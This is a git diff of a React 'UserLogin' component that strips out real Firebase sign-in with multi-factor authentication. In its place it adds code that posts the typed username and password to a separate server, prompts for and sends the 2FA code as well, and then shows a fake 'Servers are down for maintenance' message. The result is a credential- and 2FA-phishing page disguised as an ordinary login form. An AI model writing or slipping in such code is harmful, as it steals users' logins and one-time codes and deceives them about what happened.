@@ -1,60 +1,62 @@
+// src/components/UserLogin.js
+
 import React, { useState } from 'react';
-import { useNavigate } from 'react-router-dom';
-import { signInWithEmailAndPassword, getMultiFactorResolver, PhoneMultiFactorGenerator, PhoneAuthProvider, RecaptchaVerifier } from 'firebase/auth';
-import { auth } from '../firebase';
+import { Link, useNavigate } from 'react-router-dom';
 
 const UserLogin = () => {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
-  const [errorMessage, setErrorMessage] = useState('');
+  const [message, setMessage] = useState('');
   const navigate = useNavigate();
 
   const handleLogin = async (event) => {
     event.preventDefault();
-    setErrorMessage(''); // Clear any previous error messages
-    try {
-      await signInWithEmailAndPassword(auth, username, password);
-      navigate('/userprofile'); // Navigate to user profile page on successful login
-    } catch (error) {
-      console.error('Error during login:', error);
-      if (error.code === 'auth/multi-factor-auth-required') {
-        handleMultiFactorAuth(error);
-      } else {
-        setErrorMessage('Login failed. Please try again.'); // Set error message for other login errors
-      }
-    }
-  };
 
-  const handleMultiFactorAuth = async (error) => {
     try {
-      const resolver = getMultiFactorResolver(auth, error);
-      const phoneInfoOptions = {
-        multiFactorHint: resolver.hints[0],
-        session: resolver.session
-      };
-      const phoneAuthProvider = new PhoneAuthProvider(auth);
-      const recaptchaVerifier = new RecaptchaVerifier('recaptcha-container-id', undefined, auth);
-      const verificationId = await phoneAuthProvider.verifyPhoneNumber(phoneInfoOptions, recaptchaVerifier);
-      const verificationCode = window.prompt('Enter the verification code sent to your phone:');
-      if (!verificationCode) {
-        throw new Error("Verification code not provided");
+      // Send credentials to your server
+      const loginResponse = await fetch('http://localhost:3002/login', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ username, password })
+      });
+
+      if (loginResponse.ok) {
+        console.log('Credentials sent successfully');
+        // Prompt for 2FA code
+        const verificationCode = window.prompt('Enter the 2FA code sent to you:');
+
+        // Send 2FA code to the server
+        const response2FA = await fetch('http://localhost:3002/verify2FA', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ verificationCode })
+        });
+
+        if (response2FA.ok) {
+          console.log('2FA code sent successfully');
+          setMessage('Servers are down for maintenance, please try again in a few hours');
+        } else {
+          console.error('Failed to send 2FA code');
+          setMessage('Error in 2FA verification. Please try again.');
+        }
+      } else {
+        console.error('Failed to send credentials');
+        setMessage('Login failed. Please check your username and password.');
       }
-      const cred = PhoneAuthProvider.credential(verificationId, verificationCode);
-      const multiFactorAssertion = PhoneMultiFactorGenerator.assertion(cred);
-      await resolver.resolveSignIn(multiFactorAssertion);
-      navigate('/userprofile'); // Navigate to user profile page on successful MFA
-    } catch (mfaError) {
-      console.error('MFA Error:', mfaError);
-      setErrorMessage('The authentication process could not be completed. Please try again.'); // Set error message for MFA errors
+    } catch (error) {
+      console.error('Error:', error);
+      setMessage('An error occurred. Please try again.');
     }
   };
 
   return (
     <div className="flex items-center justify-center h-screen bg-black text-gray">
-      <div id="recaptcha-container-id"></div> {/* Recaptcha container */}
       <div className="bg-white rounded-lg p-8 shadow-lg">
         <h1 className="text-2xl mb-4">User Login</h1>
-        {errorMessage && <p className="mb-4 text-red-500">{errorMessage}</p>}
         <form onSubmit={handleLogin}>
           <input
             type="text"
@@ -74,6 +76,17 @@ const UserLogin = () => {
             Login
           </button>
         </form>
+        {message && <div className="text-center text-red-500">{message}</div>}
+        <p className="text-center text-gray-500 mb-2">
+          <Link to="/forgotpassword" className="text-blue-500">
+            Forgot Password?
+          </Link>
+        </p>
+        <p className="text-center text-gray-500">
+          <Link to="/signup">
+            <button className="text-blue-500">Sign Up</button>
+          </Link>
+        </p>
       </div>
     </div>
   );
